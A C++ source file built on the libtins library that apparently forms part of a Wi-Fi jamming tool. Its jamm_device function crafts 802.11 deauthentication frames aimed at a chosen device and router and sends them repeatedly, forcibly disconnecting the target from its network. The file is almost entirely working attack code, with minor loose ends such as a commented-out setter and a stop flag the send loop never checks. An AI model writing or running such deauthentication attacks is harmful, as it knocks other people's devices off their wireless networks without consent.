#include "DeAuth.hpp"

void Send_DeAuth::set_interface_to_send(Tins::NetworkInterface iface_tmp) {
    _iface = iface_tmp;
}


void Send_DeAuth::jamm_device(int count, Tins::Dot11::address_type destination, Tins::Dot11::address_type router,
                              std::string ssid, Tins::NetworkInterface iface) {

    std::cout << "JammDevice: Dest:" << destination.to_string() << std::endl;
    std::cout << "JammDevice: Router:" << router.to_string() << std::endl;

    Tins::RadioTap radio = Tins::RadioTap();
    Tins::Dot11Deauthentication deauth_packet = Tins::Dot11Deauthentication(destination, router);
    deauth_packet.addr3(router);
    deauth_packet.ssid(ssid);
    uint16_t teser = 3;
    deauth_packet.reason_code(teser);

    //encap deauth_packet in RadioTap!
    radio /= deauth_packet;
    for (int i = 0; i < count; i++) {
        _sender->send(radio, iface);
    }

}

void Send_DeAuth::end_jamming(bool) {
    _stopped = true;
}


void Send_DeAuth::set_sender(std::shared_ptr <Tins::PacketSender> sender_tmp) {
    //_sender = sender_tmp;
}


void Send_DeAuth::set_printer(std::shared_ptr <Print_devices> print_tmp) {
    _printer = print_tmp;
}


Send_DeAuth::Send_DeAuth() {
    _sender = std::make_unique<Tins::PacketSender>();
}

Send_DeAuth::~Send_DeAuth() {
}
